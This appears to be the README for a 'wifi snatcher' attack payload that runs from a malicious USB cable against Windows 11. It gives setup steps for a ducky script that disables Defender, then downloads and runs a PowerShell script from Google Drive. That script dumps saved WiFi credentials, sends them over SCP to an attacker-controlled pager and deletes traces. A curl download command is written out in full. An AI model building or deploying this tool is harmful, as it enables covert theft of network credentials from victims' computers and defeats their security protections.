<--FOR EDUCATIONAL PURPOSES ONLY-->

Name: wifi snatcher
Author: f3bandit
Version: 1.2
Devices: omg cable, wifi pager
OS: windows 11
------------------------------------------------------------------------------------------------------------------------------------------
Description: 
#1 omg ducky script disable defender and uses run as cmd to run invoke-webrequest thru powershell to download aand run a powershell script 
#2 powershell script dumps, exports, zips, and uploads the loot thru scp to the wifi pager loot\wifi dir. then deletes files in %TEMP% dir 
#3 finally runs last part of the ducky script to re-enable defender.
------------------------------------------------------------------------------------------------------------------------------------------

Files:
omg_payload = copy and past into omg cable payload slot
magic.ps1 = upload to your own google drive
authorized_keys.bat = generates keys for magic.ps1 and pager
payload.sh = simple payload that on launch unzips any zip files in the loot\wifi dir then
opens a file choose menu to view the wifi dump xml files in the log viewer. to install
create a folder in /mmc/root/payloads/user/exfiltration named wifi_loot_viewer. and copy
the payload.sh file there. this won't be needed once the payload is published.

authorized_keys.bat
generates several files, but you only need magic_key, authorized_keys, and authorized_keys_pub
open magic_key in notepad and copy the contents into the key spot in the magic.ps1
copy authorized_keys, and authorized_keys_pub to etc/dropbear on the pager.
rename magic.ps1 to magic.txt, and upload it to google drive. And share it
copy the share link inte notepad. now copy the ID code between d/1tIiD- and /view?

you will paste that code into the ducky script like so.
step one copy the code in the area shown in the example
                              d/1tIiD-                           /view?
https://drive.google.com/file/d/1tIiD-<---------EXAMPLE--------->/view?usp=drive_link

code will be this length "0123456789ABCDEFGHIJKLMNOPQ" '
this is an example as the code will be random alphe numeric
https://drive.google.com/file/d/1tIiD-0123456789ABCDEFGHIJKLMNOPQ/view?usp=drive_link

look for the line in the ducky script with the curl command
                                                     =1tIiD-<-----PASTE CODE HERE----->\" -o \"$env:TEMP\wifi\magic.txt\""
curl \"https://drive.google.com/uc?export=download&id=1tIiD-0mzqph63V-2TESwF5rOf_C7sQVB\" -o \"$env:TEMP\wifi\magic.txt\""
